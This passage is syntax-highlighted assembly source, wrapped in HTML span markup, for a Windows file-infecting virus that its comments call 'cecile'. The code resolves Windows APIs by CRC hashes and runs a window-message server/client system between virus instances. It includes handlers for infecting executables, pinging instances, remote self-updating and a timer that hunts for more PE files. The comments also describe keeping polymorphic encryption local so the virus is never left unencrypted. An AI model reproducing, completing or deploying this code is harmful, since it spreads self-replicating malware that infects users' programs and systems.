</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; load api adress base</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; save crc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; put eax = 3</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">15</span><span class="sc0">      </span><span class="sc1">; check ebx = 15 ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dontregisterit</span><span class="sc0">              </span><span class="sc1">; special code for registering</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load old ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; load pointer in it</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">getagainme5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">; check for a free</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; place in it</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getagainme5</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; save crc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; save adress</span><span class="sc0">

</span><span class="sc5">dontregisterit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">                           </span><span class="sc1">; restore everything</span><span class="sc0">

</span><span class="sc5">dontcallapi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0CCh</span><span class="sc0">             </span><span class="sc1">; int 3 there ?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">dontcallapi</span><span class="sc0">                 </span><span class="sc1">; really then go away</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">gotittatam</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; not requested api</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; return and check </span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                         </span><span class="sc1">; next api</span><span class="sc0">

</span><span class="sc5">ExtendedApiCall</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; load api crc buffer</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">getnext277</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; have we arleady </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">directcallit</span><span class="sc0">                    </span><span class="sc1">; searched that api</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; check if ecx = 0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getnext277</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">                      </span><span class="sc1">; set save to buffer</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Intrn_ApiCallit</span><span class="sc0">                 </span><span class="sc1">; to Api finder</span><span class="sc0">

</span><span class="sc5">directcallit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; restore API adress</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dontregisterit</span><span class="sc0">                  </span><span class="sc1">; call it</span><span class="sc0">

</span><span class="sc5">loadhandle</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; save handle to be fixed with</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; watch if you need a loadlib</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gotbyebye</span><span class="sc0">           </span><span class="sc1">; or a get module</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">apicall</span><span class="sc0">     </span><span class="sc2">0BAE81A01h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; LoadLibraryA from kernel</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getthere</span><span class="sc0">

</span><span class="sc5">gotbyebye</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">apicall</span><span class="sc0">     </span><span class="sc2">01017D1A1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; GetModuleHandle in (0) (krnl)</span><span class="sc0">

</span><span class="sc5">getthere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">kernelbase</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ll1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; save adress to khandles</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">savebase</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400000h</span><span class="sc0">
</span><span class="sc5">kernelbase</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; 15 library handle free</span><span class="sc0">

</span><span class="sc5">khandles</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">15</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; What does the Server/client assume ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Well, the server client use a prebuilded windows server/client mode in</span><span class="sc0">
</span><span class="sc1">; order to work, thus permetting with api to access an easy interprocess </span><span class="sc0">
</span><span class="sc1">; communication and messaging between virus hinstances. By creating his own </span><span class="sc0">
</span><span class="sc1">; window proc, the window proc wait for message that are sent each time the</span><span class="sc0">
</span><span class="sc1">; virus is run. This client server mode can be seen as a queen/bee colony, as</span><span class="sc0">
</span><span class="sc1">; it have many aspects of it, having a queen, having workers, assigning task </span><span class="sc0">
</span><span class="sc1">; and develloping, expanding the colony.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; the virus handle a few message :      1st stable workin 1/10/2K</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - A timer will tell to the server to find a much PE</span><span class="sc0">
</span><span class="sc1">;           and/or updating the timer of the routine (client/serv)</span><span class="sc0">
</span><span class="sc1">;       - A routine that is used only by the server, it register client</span><span class="sc0">
</span><span class="sc1">;           to the common memory when they are runned</span><span class="sc0">
</span><span class="sc1">;       - An infection message that specify a location in the common</span><span class="sc0">
</span><span class="sc1">;           memory where the file name is stocked, then prepare</span><span class="sc0">
</span><span class="sc1">;           for a module calling, then pass control to module</span><span class="sc0">
</span><span class="sc1">;       - If the process is closed, the server is able to select an</span><span class="sc0">
</span><span class="sc1">;           other and swap himself</span><span class="sc0">
</span><span class="sc1">;       - A client server ping pong system used when a time out </span><span class="sc0">
</span><span class="sc1">;           has been detected, used to see if client disconnected</span><span class="sc0">
</span><span class="sc1">;           coz process crashed or such</span><span class="sc0">
</span><span class="sc1">;       - An updating message wich can be called to the server by any</span><span class="sc0">
</span><span class="sc1">;           External virus hinstance, this making cecile an </span><span class="sc0">
</span><span class="sc1">;           "updatable" virus alike. See modulisation topic</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Alternatively, the server assume also the passing trough module, if infection</span><span class="sc0">
</span><span class="sc1">; is send to remote process, polymorphic encryption is directly send to the </span><span class="sc0">
</span><span class="sc1">; current process and not given as message, coz the message could fail, if </span><span class="sc0">
</span><span class="sc1">; as exemple, the message is sent in the dead time of a closed or crashed </span><span class="sc0">
</span><span class="sc1">; process and could let, the virus unencrypted, wich could be very dangerous </span><span class="sc0">
</span><span class="sc1">; for us.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">WM_REGCLIENT</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">50701</span><span class="sc0">
</span><span class="sc5">WM_INFECTEXE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">50702</span><span class="sc0">
</span><span class="sc5">WM_VIRPING</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">50703</span><span class="sc0">
</span><span class="sc5">WM_UPDATE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">50704</span><span class="sc0">

</span><span class="sc5">winproc</span><span class="sc4">:</span><span class="sc0">       

</span><span class="sc5">hwndval</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">hmsgval</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">wpamval</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">lpamval</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">hmsgval</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">                  </span><span class="sc1">; WM_CREATE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">returnnull</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">                  </span><span class="sc1">; WM_RESIZE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">returnnull</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">WM_REGCLIENT</span><span class="sc0">            </span><span class="sc1">; our register message</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">regclient</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">WM_INFECTEXE</span><span class="sc0">            </span><span class="sc1">; our client message</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Infectexe</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">WM_VIRPING</span><span class="sc0">              </span><span class="sc1">; dead test</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ReturnPing</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">WM_UPDATE</span><span class="sc0">               </span><span class="sc1">; update code and add</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">updatecode9</span><span class="sc0">             </span><span class="sc1">; new version </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">113h</span><span class="sc0">                </span><span class="sc1">; WM_TIMER</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">timerset</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; WM_CLOSE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">switchserver</span><span class="sc0">

</span><span class="sc5">translatemessage</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">wpamval</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">hmsgval</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">apicall</span><span class="sc0">  </span><span class="sc2">023ED6274h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; DefWindowProcA</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    
    </span><span class="sc5">returnnull</span><span class="sc4">:</span><span class="sc0">
    
        </span><span class="sc6">ret</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">registernet0</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">768</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; load the net handle of it</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; if zero then it's bad</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skip_loadit</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_VIRPING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0FBAC7F60h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; SendMessageA</span><span class="sc0">
                        </span><span class="sc1">; the trust pass , </span><span class="sc0">
                        </span><span class="sc1">; Alife or Not ?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; restore</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">returnerror</span><span class="sc0">         </span><span class="sc1">; is it still alife ?</span><span class="sc0">

</span><span class="sc5">skip_loadat0</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">loadpointer</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">windowproc01</span><span class="sc4">,</span><span class="sc5">v119</span><span class="sc0">   </span><span class="sc1">; no then register this </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; cecile handle to the</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">768</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; value</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">skip_loadit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; return it normally</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">skip_loadat0</span><span class="sc0">

    </span><span class="sc5">returnerror</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; return with error,</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; network registered</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">updatecode9</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc5">wpamval</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateThisModule</span><span class="sc0">            </span><span class="sc1">; update from remote</span><span class="sc0">
                            </span><span class="sc1">; process</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">ReturnPing</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; return window value</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">          

</span><span class="sc5">regclient</span><span class="sc4">:</span><span class="sc0">
    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">wpamval</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">lpamval</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckUpdated</span><span class="sc0">                </span><span class="sc1">; see if + recent</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">

</span><span class="sc5">goaway</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; watch for a zero</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">setzero</span><span class="sc0">                 </span><span class="sc1">; in the first</span><span class="sc0">
                            </span><span class="sc1">; zone</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; forget it</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">regit</span><span class="sc0">

